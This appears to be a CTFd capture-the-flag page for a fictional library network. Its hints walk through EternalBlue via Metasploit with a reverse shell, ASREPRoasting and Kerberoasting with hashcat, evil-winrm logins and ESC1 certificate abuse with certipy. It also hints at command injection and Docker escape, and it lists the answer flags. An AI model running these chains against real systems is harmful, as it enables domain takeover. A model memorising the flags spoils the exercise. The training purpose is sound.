# CTFd

<p align="center">
<img src="/files/images/libicon.png" />
</p>

Thank you for helping our Local Nonprofit Library, Bibliophile, with their security posture. As we’re about to open to the public, we wanted to make sure our sensitive files wouldn’t be compromised. We’ve given you access to our network, do what you can to find information that the public citizens shouldn’t be able to find!

# Accessing the Machines

We have one  public facing website:
**Library Terminal**: 192.168.1XX.2:5000

**We also have a few background machines our employees use. I’m not sure what the numbers for those are, but you’re a professional so I’m sure you can find it** Generally, I was told we have 3 Linux Machines and 3 Windows Machines... hopefully that information helps you.

We’re working with a guy overseas to make the numbers into words with something called DNS, but until then, we’ll have to work with the numbers only. Let us know what you find!

You can do whatever you need to gain access to the machines and find sensitive information. Just try not to destroy the machine... we worked hard on them. If you do, just let the intern know.

# Scoring - How to submit your findings (Challenges):

You will be scored based on the flags you find during your engagement. These flags should be found naturally as your progress through your Pentest. There are two types of flags:

**Objective Flag (1 per machine)** - Proves you have successfully exploited the system in the intended way.

**The Bonus Flags:** These flags scattered around the box. You may find these by doing additional exploration or exploiting something that was directly intended. The format for these flags is typically random and can be associated with their hint. For example, if the hint is “Pineapple” and the Flag is CTF{Apples_are_worse_than_Pineapples} then that is the bonus flag for that hint.

Near the end of the exercise, you’ll report how you found your findings. Your methodology, process, and thoughts will be evaluated by Bibliophile to see if you did your job properly 😊

# Pre Competition Survey

# Windows Challenges

### Intern Workstation

**Category: Windows**

**Message:** 

Something old, something new, ***something borrowed, something blue***

Our intern, Stewie, just finished setting up his workstation and wow, is he proud of it. He says it’s *"vintage secure"* and even bragged that his Windows 7 setup is “immune to modern threats.” Adorable, right?

He also mentioned something about disabling updates because they were “slowing things down.” Classic Stewie.

Anyway, he’s been working hard, so we gave him access to some shared files and let him connect to the internal network. I’m sure it’s fine.

Mind taking a quick look just to… you know, double check?

**Hints:**

1. Have you tried looking at which ports are open on the host? Some services, especially ones from the pre-Windows 10 era are surprisingly talkative.
2. If you find port 445 open, dig into SMB. You might want to use `nmap` with some safe scripts like `--script smb-vuln*` to check for known vulnerabilities. Pay attention to anything referencing 2017.
3. You're likely dealing with a machine vulnerable to **MS17-010**, a critical flaw in the SMBv1 protocol famously used by EternalBlue. You can confirm this using `nmap` with the `smb-vuln-ms17-010` script:
    
    ```bash
    bash
    CopyEdit
    nmap -p445 --script smb-vuln-ms17-010 <target-ip>
    
    ```
    
    If it comes back as vulnerable, fire up **Metasploit** and use:
    
    ```bash
    bash
    CopyEdit
    use exploit/windows/smb/ms17_010_eternalblue
    
    ```
    
    Set the target IP and payload (try `windows/x64/meterpreter/reverse_tcp`), then `run`. If successful, you’ll get a SYSTEM shell.
    

### Management Server

**Category:** Windows

**Message:**

Mickey said we needed a “robust identity solution” for our small but growing team, so we let him build us a shiny new management server. Now everyone logs in through the “corporate domain” which apparently makes us *very enterprise*.

He swears it’s secure because “the login page has our company logo on it.”

Anyway, I don’t know what “LDAP” is, but I saw the interns poking around with it earlier. Also, Mickey insists passwords should be easy to remember, like your favorite food or your Minecraft username.

You should take a look before someone starts selling our passwords on Discord again.

**Hints:**

1. 
Start by checking if you can anonymously query the domain controller’s LDAP service. Tools like `ldapsearch`, `crackmapexec`, or `netexec` can often pull down usernames with no credentials needed.
2. Some users don’t require pre-authentication for Kerberos, which means you can request their encrypted tickets and try cracking them offline. Try tools like `GetNPUsers.py` or `netexec` to do this. Keep an eye out for accounts that *don’t* need preauth.
3. Once you've dumped a list of users (e.g., via anonymous LDAP bind), you can check which ones are vulnerable to **ASREPRoasting**—meaning they don't require Kerberos pre-auth. Use `GetNPUsers.py` from Impacket like so:
    
    ```bash
    bash
    CopyEdit
    GetNPUsers.py 'domain.local/' -usersfile usernames.txt -dc-ip <DC-IP> -no-pass
    
    ```
    
    Crack the resulting hashes in **Hashcat** using mode `18200`. Example:
    
    ```bash
    bash
    CopyEdit
    hashcat -m 18200 hashes.txt /path/to/rockyou.txt
    
    ```
    
    Once you get valid creds, use them to perform **Kerberoasting**:
    
    ```bash
    bash
    CopyEdit
    GetUserSPNs.py domain.local/username:password -dc-ip <DC-IP>
    
    ```
    
    This will give you service tickets you can again crack offline using Hashcat mode `13100`.
    
    If you’re successful, you’ll get plaintext creds for a **Domain Admin** service account. With that, try:
    
    ```bash
    bash
    CopyEdit
    evil-winrm -i <DC-IP> -u <domain admin> -p <password>
    
    ```
    
    Once inside, the flag should be located somewhere fitting of a management server—perhaps in `C:\Users\Administrator\Desktop\flag.txt`.
    

### Certificate Server

**Category:** Windows

**Message:** 

Mickey told Stewie that digital certificates were the future of authentication, so Stewie spent an entire afternoon "modernizing" our server by copying settings he found on Reddit. Now apparently anyone can “enroll” for a certificate if they just say pretty please.

Mickey swears this setup is enterprise-grade because it "uses TLS."

**Hints:**

1. If you're logged in as a low-privileged domain user, check whether **Active Directory Certificate Services** is enabled on the domain. You can do this with:
    
    ```bash
    bash
    CopyEdit
    certipy find -dc-ip <DC-IP> -u <USER> -p <PASS>
    
    ```
    
2. You’re looking for a certificate **template** that:
    - Allows *Authenticated Users* to enroll
    - Has **ENROLLEE_SUPPLIES_SUBJECT** enabled, letting you request a cert for any user
    
    Certipy will flag this as **ESC1**:
    
    ```bash
    bash
    CopyEdit
    certipy find -u <USER> -p <PASS> -dc-ip <DC-IP> --vulnerable
    
    ```
    
    Check the output carefully for `ESC1` under the `Vulnerabilities` column.
    
3. Once you’ve found a vulnerable template (say, `UserCertTemplate`), you can request a certificate **as the Domain Administrator** using Certipy:
    
    ```bash
    bash
    CopyEdit
    certipy req -u <YOURUSER> -p <YOURPASS> -dc-ip <DC-IP> -ca <CA_NAME> -template UserCertTemplate -alt-name Administrator
    
    ```
    
    This will generate a `.pfx` file (e.g., `administrator.pfx`). Then, authenticate as the Domain Admin using:
    
    ```bash
    bash
    CopyEdit
    certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
    
    ```
    
    Now you have Domain Admin access. From here, use `secretsdump`, `smbclient`, or `evil-winrm` to access the system:
    
    ```bash
    bash
    CopyEdit
    evil-winrm -i <DC-IP> -u Administrator -k
    
    ```
    
    And your flag should be waiting in the usual place:
    
    ```powershell
    powershell
    CopyEdit
    C:\Users\Administrator\Desktop\flag.txt
    
    ```
    

# Linux Challenges

## **Library Terminal**

**Category**: Linux

**Message**:

Our Library Terminal is the homepage for all our readers. Instead of coming into the library or using some online book website, our Intern, Stewie, created an online terminal that is easy to use and get a preview of books! He also set it up so that if you like the book, you can grab it from the same place as well! The new age of reading is here.

On a side note, due to limited resources, Stewie placed this terminal on the same computer our employees use to store their files… but I’m sure he secured it, the great intern he is. I know Admin Mickey had some files he didn’t want to get out there…

**Hints**:

1. The terminal seems to parse only the first command given to it. Is there a way to send two commands at the same time?
2. Are there any files that contain sensitive information (passwords, users, groups) that could be useful to have?
3. Is there another service running that I could use the information I collected to access.

**Flag**: FLAG{You_Trust_The_Intern_Too_Much}

## **Email Server**

**Category**: Linux

**Message**:

Our Admin, Mickey, has graciously helped us move away from useless email clients like Outlook and Gmail into a more direct and easier to use client. Intern Stewie also set up a beautiful login page for us to use and sign into our emails. I can finally send emails without those people working in Google or Microsoft looking at the information I send!

That reminds me, I need to ask Stewie to find a way to hide sensitive information in our emails so that no one can find out what I’m talking about!

**Hints**

1. Given that the login page is asking for a username and password, there must be a way to bypass one of the checks for a successful login attempt.
2. I’ll probably need a list of users that have an email address. The server is probably checking for a known username.
3. There’s various places to hide information in an email and even more ways to hide the information itself. I wonder if there’s a website to “de-hide” the information.

**Flag**: FLAG{If_You_Give_A_Moose_A_Muffin_>_If_You_Give_A_Mouse_A_Cookie}

## **Vault Server**

**Category**: Linux

**Message**:

I told Manager Mike to move my secret book to a more secure place. I heard about this new technology called “Docker” and felt like it had to be done. Hopefully it isn’t rushed, but I told them to do it as quickly as possible.

As long as my book is secure. That’s all that matters.

**Hints**:

1. Is there a place where I could get the password for one of the users? Perhaps on another computer with the same account information?
2. To get access to the container, there is a different password for the user. Is there a file that docker has that shows the configuration of a container?
3. I’m in the container, but the file is on the host and not inside the container… how can I add a file from the outside into a container?

**Flag**: FLAG{Old_Habits_Die_Hard}

## Bonus Flags:

(Linux Easy) Google: FLAG{All_he-had_to_do_was_google_it?}

(Linux Med) Sensitive Information: FLAG{ThisButSensitiveInformationYeah?}

(Linux Med) Unpaid Intern: FLAG{Stewie = No pay.}

(Linux Med) Picture: FLAG{Put_A_Password_On_The_Picture_Next_Time}

(Linux Hard) It’s Secure! : CTF{Docker_Is_Secure}

# Post Competition Survey